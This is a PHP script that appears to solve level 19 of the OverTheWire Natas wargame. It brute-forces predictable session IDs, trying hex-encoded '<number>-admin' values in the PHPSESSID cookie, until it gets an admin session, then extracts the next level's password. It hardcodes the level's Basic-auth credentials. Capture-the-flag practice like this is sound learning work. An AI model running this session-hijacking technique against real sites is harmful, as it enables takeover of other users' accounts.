<?php

function get($url, $i)
{
    $username = "natas19";
    $password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n"
                       . "authorization: Basic $string\r\n"
                       . "cookie: PHPSESSID=$i",
            'method'  => 'GET'
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}

for ($i = 0; $i < 641; $i++)
{
    $session = bin2hex("$i-admin");
    echo "Checking $session\r\n";
    $response = get("http://natas19.natas.labs.overthewire.org", $session);
    if (strpos($response, "You are an admin."))
    {
        $password = substr($response, strpos($response, "Password: ") + 10, 32);
        exit("Got it! Session ID $session is Admin.\r\nNatas20 Password: $password");
    }
    elseif (!strpos($response, "You are logged in as a regular user."))
    {
        var_dump($response);
    }
}